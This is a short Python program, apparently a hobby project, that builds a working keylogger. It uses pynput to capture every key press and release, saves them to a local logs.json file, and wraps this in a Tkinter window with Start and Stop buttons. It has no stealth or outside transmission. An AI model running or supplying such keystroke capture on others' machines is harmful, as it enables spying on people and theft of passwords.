import json
import threading
import tkinter as tk
from tkinter import *
from pynput import keyboard

key_list = []
x = False
key_strokes = ""
listener = None

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        key_log.write(json.dumps(key_list))

def on_press(key):
    global x, key_list
    if x is False:
        key_list.append({'Pressed': str(key)})
        x = True
        if x is True:
            key_list.append({'Held': str(key)})
            update_json_file(key_list)

def on_release(key):
    global x, key_list
    key_list.append({'Released': str(key)})
    if x is True:
        x = False
        update_json_file(key_list)

def start_keylogger():
    global listener
    print("[+] Running Keylogger successfully!\n [!] Saving the key logs in 'logs.json'")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()

def on_start():
    start_keylogger()

def on_stop():
    print("Keylogger is halted, press <Start> to start it again!!!")
    stop_keylogger()

window = tk.Tk()
window.title("Keylogger Control")
window.geometry("300x300")



def set_text_by_button():
 
    
    sample_text.delete(0,"end")
     
    
    sample_text.insert(0, "Keylogger is capturing!")

def set_text_by_stop_button():
 
   
    sample_text.delete(0,"end")
     
    sample_text.insert(0, "Stop button is pressed!")

sample_text = tk.Entry(window)
sample_text.pack()

canvas = Canvas(window, height=500, width=500)
canvas.create_oval(50, 50, 250, 250, fill="navy blue",
                   width=20, outline="orchid")


button = Button(window, text='Start', width=10,
                       command=lambda: [on_start(), set_text_by_button()]).place(x=110, y=130)

button = Button(window, text='Stop', width=10,
                       command=lambda: [on_stop(), set_text_by_stop_button()]).place(x=110, y=190)
canvas.pack()
window.mainloop()
